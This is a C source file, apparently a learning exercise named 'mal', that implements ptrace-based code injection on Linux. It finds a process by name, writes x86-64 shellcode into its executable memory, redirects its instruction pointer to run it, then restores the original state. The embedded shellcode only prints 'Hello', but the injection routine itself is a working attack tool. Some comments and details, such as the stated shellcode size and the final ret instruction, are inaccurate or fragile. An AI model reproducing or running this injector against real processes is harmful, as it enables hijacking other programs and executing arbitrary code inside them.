// mal.c
#include <stdio.h>      // For standard I/O like printf
#include <stdlib.h>     // For functions like atol, exit
#include <string.h>     // For string manipulation like strcmp, strcspn
#include <unistd.h>     // For functions like getpid, sleep
#include <dirent.h>     // For reading directories (/proc)
#include <sys/ptrace.h> // For the ptrace() syscall
#include <sys/wait.h>   // For waitpid()
#include <sys/user.h>   // For user_regs_struct

// Hardcoded standart shellcode
// 19 bytes
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x35, 0x0a, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc2, 0x06, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0xc3,                         // <== ret instead of int3
    0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x0a
};


pid_t find_pid_by_name(char *p_name);

long get_exec_mem_addr(pid_t pid);

/*          Usage
 * >>> ./mal <target_process_name> <optational_shellcode_path>
 *
 * 
 *  
 */

int main(int argc, char *argv[]) {
    if(argc != 2 && argc != 3){
        printf("Error: correct usage >>> %s <target_process_name> <optational_shellcode_path>\n", argv[0]);
        return 1;
    }

    char *target_process_name = argv[1];
    pid_t target_pid = find_pid_by_name(target_process_name);
    if(target_pid == -1){
        printf("Error: could not find process %s\n", target_process_name);
        return 1; 
    }


    // ATTACHMENT
    printf("Attaching to process %d...\n", target_pid);
    if(ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("Error: on ptrace ATTACH\n");
        return 1;
    }

    waitpid(target_pid, NULL, 0);
    
    ptrace(PTRACE_SYSCALL, target_pid, NULL, NULL);     
    waitpid(target_pid, NULL, 0);
    
    printf("Target process successfully stopped!\n");

    // INJECTION
    int error = 0;
    // Finds executable memory address 
    long inj_mem_addr = get_exec_mem_addr(target_pid);
    if(inj_mem_addr == 0) {
        printf("Fail: no executable memory address on target...\n");
        if(ptrace(PTRACE_DETACH, target_pid, NULL, NULL) == -1) {
            perror("Error: on ptrace DETACH\n");
            return 1;
        }
        return 1;
    }
    printf("Found executable memory address: 0x%lx\n", inj_mem_addr);

    // Backup target original code and registers
    const int size_shellcode_words = (sizeof(shellcode) + sizeof(long) - 1) / sizeof(long);
    long original_code[size_shellcode_words];

    for(int i = 0; i < size_shellcode_words; i ++) {
        // Copies each word from target memory to backup
        original_code[i] = ptrace(PTRACE_PEEKTEXT, target_pid, inj_mem_addr + i*sizeof(long), NULL);
    }
    // Backup registers
    struct user_regs_struct original_regs, regs; 
    error += ptrace(PTRACE_GETREGS, target_pid, NULL, &original_regs);


    // Inject shellcode into target memory
    for(int i = 0; i < size_shellcode_words; i++) {
        // Copies each word from shellcode to target memory
        long data = 0;
         memcpy(&data, shellcode + i * sizeof(long), sizeof(long));
        error += ptrace(PTRACE_POKETEXT, target_pid, inj_mem_addr + i*sizeof(long), data);
    }
    // Set registers (specially RIP) of target process
    memcpy(&regs, &original_regs, sizeof(struct user_regs_struct));
    regs.rip = inj_mem_addr;
    error += ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
    
    printf("Running injected code...\n");

    /* 
    for(int i = 0; i < 20; i++) {
        error += ptrace(PTRACE_SINGLESTEP, target_pid, NULL, NULL);
        waitpid(target_pid, NULL, 0);
        ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
        printf("RIP: 0x%llx, RAX: 0x%llx, RDI: 0x%llx, RSI: 0x%llx, RDX: 0x%llx\n", regs.rip, regs.rax, regs.rdi, regs.rsi, regs.rdx);
    } 
    */

    ptrace(PTRACE_CONT, target_pid, NULL ,NULL);
    waitpid(target_pid, NULL, 0);


    printf("Injected code successfully executed!\n");

    if(error != 0) {
        printf("Number of errors in injection phase: %d", error);
    }

    // Restore the previous state
    for(int i = 0; i < size_shellcode_words; i++) {
        // Copies each word from backup to target memory
        ptrace(PTRACE_POKETEXT, target_pid, inj_mem_addr + i*sizeof(long), original_code[i]);
    }
    // Restore the registers to previous state
    ptrace(PTRACE_SETREGS, target_pid, NULL, &original_regs);


    // DETACHMENT
    if(ptrace(PTRACE_DETACH, target_pid, NULL, NULL) == -1) {
        perror("Error: on ptrace DETACH\n");
        return 1;
    }

    return 0;
}


pid_t find_pid_by_name(char *p_name){
    DIR* dir;
    struct dirent* entry;
    char path[256];
    char buffer[256];
    FILE* fp;
    
    if((dir = opendir("/proc")) == NULL) {
        perror("Error: on opendir /proc\n");
        return -1;
    }

    while((entry = readdir(dir)) != NULL){
        long pid = atol(entry->d_name);
        if(pid > 0) {
            snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
            fp = fopen(path, "r");
            if(fp){
                fgets(buffer, sizeof(buffer), fp);
                
                buffer[strcspn(buffer, "\n")] = 0;

                fclose(fp);
                if(strcmp(p_name, buffer) == 0) {
                    closedir(dir);
                    return (pid_t)pid;
                }
            }
        }
    }

    closedir(dir);
    return -1;
}


long get_exec_mem_addr(pid_t pid) {
    long addr = 0;
    char path[256];
    char buffer[256];
    FILE* fp;

    snprintf(path, sizeof(path), "/proc/%d/maps", pid);

    fp = fopen(path, "r");
    if(fp == NULL) {
        perror("Error: fopen .../maps");
        return 0;
    }

    while(fgets(buffer, sizeof(buffer), fp) != NULL) {
        if(strstr(buffer, "r-xp")) {                    // Could add "rwxp" too!
            sscanf(buffer, "%lx-", &addr);
            break;
        }
    }

    fclose(fp);
    return addr;
}
